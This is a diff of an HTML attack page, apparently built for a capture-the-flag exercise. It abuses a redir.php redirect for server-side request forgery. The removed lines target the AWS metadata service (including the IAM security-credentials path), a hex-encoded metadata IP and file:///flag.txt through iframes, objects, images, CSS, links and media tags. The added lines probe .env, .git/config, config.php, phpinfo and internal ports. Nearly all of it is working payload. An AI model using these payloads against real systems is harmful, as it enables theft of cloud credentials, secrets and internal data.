@@ -1,49 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Alternative SSRF Methods</title>
+    <title>HTTP-Based Flag Discovery</title>
+    <style>
+        .section { margin: 20px 0; padding: 10px; border: 1px solid #ccc; }
+        h3 { color: #333; }
+        iframe { border: 1px solid #666; margin: 5px 0; }
+    </style>
 </head>
 <body>
-    <h1>Alternative SSRF Techniques</h1>
+    <h1>HTTP-Based SSRF Flag Discovery</h1>
     
-    <!-- Method 1: URL Encoded Payloads -->
-    <h3>URL Encoded AWS Metadata</h3>
-    <iframe src="http://localhost/redir.php?url=http%3A//169.254.169.254/latest/meta-data/" width="100%" height="300"></iframe>
-    
-    <!-- Method 2: Different IP Representations -->
-    <h3>Alternative IP Formats</h3>
-    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="300"></iframe>
-    <iframe src="http://localhost/redir.php?url=http://0xa9fea9fe/latest/meta-data/" width="100%" height="200"></iframe>
-    
-    <!-- Method 3: Object and Embed Elements -->
-    <h3>Object/Embed Based Requests</h3>
-    <object data="http://localhost/redir.php?url=file:///flag.txt" width="100%" height="200">
-        <embed src="http://localhost/redir.php?url=file:///flag.txt" width="100%" height="200">
-    </object>
-    
-    <!-- Method 4: Image with Error Handling -->
-    <h3>Image-Based Attempts</h3>
-    <img src="http://localhost/redir.php?url=file:///flag.txt" width="100%" height="200" 
-         alt="Flag content should appear here if successful">
-    
-    <!-- Method 5: CSS Background Images -->
-    <h3>CSS-Based Requests</h3>
-    <div style="background-image: url('http://localhost/redir.php?url=file:///flag.txt'); 
-                width: 100%; height: 200px; background-size: contain; background-repeat: no-repeat;">
+    <!-- Common Flag Endpoints -->
+    <div class="section">
+        <h3>1. Common Flag Endpoints</h3>
+        <iframe src="http://localhost/redir.php?url=http://localhost/flag.txt" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/flag" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/flag.php" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/secret.txt" width="100%" height="150"></iframe>
     </div>
-    
-    <!-- Method 6: Link with different types -->
-    <h3>Link-Based Requests</h3>
-    <link rel="stylesheet" href="http://localhost/redir.php?url=file:///flag.txt">
-    <link rel="prefetch" href="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/">
-    
-    <!-- Method 7: Audio/Video Elements -->
-    <h3>Media Element Requests</h3>
-    <audio controls>
-        <source src="http://localhost/redir.php?url=file:///flag.txt" type="audio/mpeg">
-    </audio>
-    <video controls width="100%" height="200">
-        <source src="http://localhost/redir.php?url=file:///flag.txt" type="video/mp4">
-    </video>
+
+    <!-- Application Directories -->
+    <div class="section">
+        <h3>2. Application Directories</h3>
+        <iframe src="http://localhost/redir.php?url=http://localhost/admin/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/config/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/uploads/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/files/" width="100%" height="200"></iframe>
+    </div>
+
+    <!-- PHP Info and Config -->
+    <div class="section">
+        <h3>3. Configuration & Info</h3>
+        <iframe src="http://localhost/redir.php?url=http://localhost/phpinfo.php" width="100%" height="300"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/config.php" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/info.php" width="100%" height="200"></iframe>
+    </div>
+
+    <!-- Hidden Files -->
+    <div class="section">
+        <h3>4. Hidden/Backup Files</h3>
+        <iframe src="http://localhost/redir.php?url=http://localhost/.env" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/backup/" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/.git/config" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/robots.txt" width="100%" height="150"></iframe>
+    </div>
+
+    <!-- Different Ports -->
+    <div class="section">
+        <h3>5. Internal Services on Different Ports</h3>
+        <iframe src="http://localhost/redir.php?url=http://127.0.0.1:8080/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://127.0.0.1:3000/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://127.0.0.1:8000/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://127.0.0.1:9000/" width="100%" height="200"></iframe>
+    </div>
+
+    <!-- Application Endpoints -->
+    <div class="section">
+        <h3>6. Application-Specific Endpoints</h3>
+        <iframe src="http://localhost/redir.php?url=http://localhost/redir.php" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/preview.php" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/api/" width="100%" height="200"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/debug/" width="100%" height="200"></iframe>
+    </div>
+
+    <!-- Status/Health Endpoints -->
+    <div class="section">
+        <h3>7. Status & Health Endpoints</h3>
+        <iframe src="http://localhost/redir.php?url=http://localhost/status" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/health" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/version" width="100%" height="150"></iframe>
+        <iframe src="http://localhost/redir.php?url=http://localhost/test.php" width="100%" height="150"></iframe>
+    </div>
 </body>
 </html>
